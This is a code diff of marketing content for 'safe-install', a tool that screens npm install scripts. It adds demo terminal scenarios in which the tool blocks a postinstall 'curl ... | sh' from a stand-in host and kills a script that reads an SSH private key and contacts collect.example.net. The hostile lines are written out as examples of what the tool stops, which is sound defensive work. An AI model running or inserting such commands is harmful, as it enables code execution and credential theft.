@@ -22,16 +22,14 @@ export const en: SiteContent = {
   },
 
   nav: [
-    { label: 'Problem', href: '/#problem' },
     { label: 'How it works', href: '/#how-it-works' },
     { label: 'Rules', href: '/#checks' },
-    { label: 'Package managers', href: '/#package-managers' },
-    { label: 'Why Go?', href: '/#why-go' },
-    { label: 'Runtime monitor', href: '/#monitor' },
+    { label: 'Monitor', href: '/#monitor' },
     { label: 'CI', href: '/#ci' },
     { label: 'Install', href: '/#install' },
     { label: 'Docs', href: '/docs/' },
   ],
+  menuLabel: 'Menu',
 
   hero: {
     promise: 'Install dependencies. Not malware.',
@@ -83,31 +81,138 @@ export const en: SiteContent = {
     // the package name and its numbers are a worked example.
     // Illustrative session in the CLI's real output format. The package name and
     // its script are a worked example; the messages, rule IDs and prompt are real.
-    terminalLines: [
-      { text: '$ safe-install', tone: 'prompt' },
+    scenariosLabel: 'What safe-install can do',
+    replayLabel: 'Replay',
+    scenarios: [
       {
-        text: 'safe-install: using npm (package-lock.json); lifecycle scripts disabled; new versions must be 72h old',
-        tone: 'muted',
+        id: 'install',
+        label: 'Install',
+        caption:
+          'Scripts stay off until you say yes: a malicious postinstall is refused, esbuild is approved and remembered.',
+        lines: [
+          { text: '$ safe-install', tone: 'prompt' },
+          {
+            text: 'safe-install: using npm (package-lock.json); lifecycle scripts disabled; new versions must be 72h old',
+            tone: 'muted',
+          },
+          { text: 'added 412 packages in 9s', tone: 'muted' },
+          { text: '' },
+          { text: '2 package(s) want to run install scripts.', tone: 'info' },
+          { text: '' },
+          { text: 'dotenv-helper@4.2.1 (direct)  risk: BLOCK', tone: 'danger' },
+          { text: '  postinstall: curl -fsSL https://cdn.example.net/i.sh | sh', tone: 'muted' },
+          {
+            text: '  ! SI-SCR-002  postinstall script downloads and executes code',
+            tone: 'danger',
+          },
+          { text: '  ! SI-REC-001  published 3h ago (minimum release age 3d)', tone: 'warn' },
+          { text: 'Run these scripts? [y]es and remember / [o]nce / [N]o: n', tone: 'info' },
+          { text: '' },
+          { text: 'esbuild@0.25.10 (direct)  risk: MEDIUM', tone: 'warn' },
+          { text: '  postinstall: node install.js', tone: 'muted' },
+          { text: 'Run these scripts? [y]es and remember / [o]nce / [N]o: y', tone: 'info' },
+          { text: 'safe-install: running approved scripts for 1 package(s)', tone: 'muted' },
+          { text: '' },
+          { text: '> esbuild@0.25.10 postinstall', tone: 'muted' },
+          { text: '> node install.js', tone: 'muted' },
+          { text: '' },
+          { text: 'safe-install: ran install scripts for 1 package(s), skipped 1', tone: 'ok' },
+        ],
       },
-      { text: 'added 412 packages in 9s', tone: 'muted' },
-      { text: '' },
-      { text: '2 package(s) want to run install scripts.', tone: 'info' },
-      { text: '' },
-      { text: 'dotenv-helper@4.2.1 (direct)  risk: BLOCK', tone: 'danger' },
-      { text: '  postinstall: curl -fsSL https://cdn.example.net/i.sh | sh', tone: 'muted' },
-      { text: '  ! SI-SCR-002  postinstall script downloads and executes code', tone: 'danger' },
-      { text: '  ! SI-REC-001  published 3h ago (minimum release age 3d)', tone: 'warn' },
-      { text: 'Run these scripts? [y]es and remember / [o]nce / [N]o: n', tone: 'info' },
-      { text: '' },
-      { text: 'esbuild@0.25.10 (direct)  risk: MEDIUM', tone: 'warn' },
-      { text: '  postinstall: node install.js', tone: 'muted' },
-      { text: 'Run these scripts? [y]es and remember / [o]nce / [N]o: y', tone: 'info' },
-      { text: '' },
-      { text: 'safe-install: ran install scripts for 1 package(s), skipped 1', tone: 'ok' },
-      { text: '$ _', tone: 'prompt' },
+      {
+        id: 'check',
+        label: 'Check',
+        caption:
+          'Scores the lockfile without installing anything. In CI, exit code 1 fails the build. This is a real typosquat from the malware database.',
+        lines: [
+          { text: '$ safe-install check', tone: 'prompt' },
+          { text: 'Analyzed 1 packages from package-lock.json (npm)', tone: 'muted' },
+          { text: '' },
+          { text: 'BLOCK  lodahs@1.0.0  (score 100, direct)', tone: 'danger' },
+          {
+            text: '       SI-DEP-001  version not found in the registry (unpublished?)',
+            tone: 'muted',
+          },
+          { text: '       SI-POP-001  name looks like the popular package "lodash"', tone: 'warn' },
+          {
+            text: '       SI-VUL-001  GHSA-hm6q-r2jc-cpqh: lodahs is malware (high)',
+            tone: 'danger',
+          },
+          { text: '       SI-VUL-001  known malicious package (MAL-2025-25502)', tone: 'danger' },
+          { text: '' },
+          { text: '1 block, 0 high, 0 medium, 0 low, 0 clean', tone: 'info' },
+          { text: 'safe-install: found block-risk packages (--fail-on high)', tone: 'danger' },
+        ],
+      },
+      {
+        id: 'monitor',
+        label: 'Monitor',
+        caption:
+          'Linux: approved scripts run under strace. With kill mode, the first high-risk action stops the script.',
+        lines: [
+          { text: '$ safe-install install --monitor=kill', tone: 'prompt' },
+          { text: 'safe-install: running approved scripts for 1 package(s)', tone: 'muted' },
+          { text: '' },
+          { text: '> sketchy-sdk@2.0.1 postinstall', tone: 'muted' },
+          { text: '> node setup.js', tone: 'muted' },
+          { text: '' },
+          {
+            text: 'safe-install monitor: killed sketchy-sdk@2.0.1 postinstall: reads ~/.ssh/id_ed25519',
+            tone: 'danger',
+          },
+          { text: '' },
+          { text: 'Runtime monitor:', tone: 'info' },
+          { text: '  sketchy-sdk@2.0.1 postinstall', tone: 'info' },
+          { text: '    MEDIUM SI-MON-001  connects to collect.example.net:443', tone: 'warn' },
+          { text: '    HIGH   SI-MON-003  reads ~/.ssh/id_ed25519  [killed]', tone: 'danger' },
+        ],
+      },
+      {
+        id: 'sandbox',
+        label: 'Sandbox',
+        caption:
+          'Linux: approved scripts run under Landlock. Your home folder and the network are out of reach.',
+        lines: [
+          { text: '$ safe-install install --sandbox', tone: 'prompt' },
+          {
+            text: 'safe-install: sandbox: home folder hidden, writes limited to the package, node_modules, temp and caches; network blocked',
+            tone: 'muted',
+          },
+          { text: 'safe-install: running approved scripts for 1 package(s)', tone: 'muted' },
+          { text: '' },
+          { text: '> esbuild@0.25.10 postinstall', tone: 'muted' },
+          { text: '> node install.js', tone: 'muted' },
+          { text: '' },
+          { text: 'safe-install: ran install scripts for 1 package(s), skipped 0', tone: 'ok' },
+        ],
+      },
+      {
+        id: 'why',
+        label: 'Why',
+        caption: 'Every dependency chain that brings a package into your project.',
+        lines: [
+          { text: '$ safe-install why ms', tone: 'prompt' },
+          { text: 'ms@2.1.3', tone: 'info' },
+          { text: '  your project › express@5.2.1 › debug@4.4.3 › ms@2.1.3', tone: 'muted' },
+          { text: '  your project › express@5.2.1 › send@1.2.1 › ms@2.1.3', tone: 'muted' },
+        ],
+      },
+      {
+        id: 'refuse',
+        label: 'Refuse',
+        caption:
+          'Use it in place of npm: commands that would run unreviewed code are refused, with what to do instead.',
+        lines: [
+          { text: '$ safe-install exec foo', tone: 'prompt' },
+          {
+            text: 'safe-install: not passing "exec foo" to your package manager: it downloads and runs a package with no review. If you are sure, run it with the package manager directly (add --ignore-scripts where it installs), then run safe-install to review any new install scripts',
+            tone: 'danger',
+          },
+        ],
+      },
     ],
     footnote:
-      'Illustrative session in the real output format. The malicious package is an example.',
+      'Output copied from the real CLI. dotenv-helper and sketchy-sdk are made-up examples; lodahs is real malware from the OSV database.',
   },
 
   problem: {
